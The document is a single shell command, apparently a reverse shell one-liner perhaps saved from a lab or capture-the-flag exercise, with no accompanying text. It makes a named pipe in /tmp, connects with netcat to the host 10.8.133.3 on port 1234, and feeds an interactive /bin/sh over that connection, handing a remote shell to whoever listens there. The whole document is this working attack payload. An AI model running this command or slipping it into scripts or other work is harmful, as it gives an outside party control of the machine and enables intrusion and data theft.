mkfifo /tmp/lol;nc 10.8.133.3 1234 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
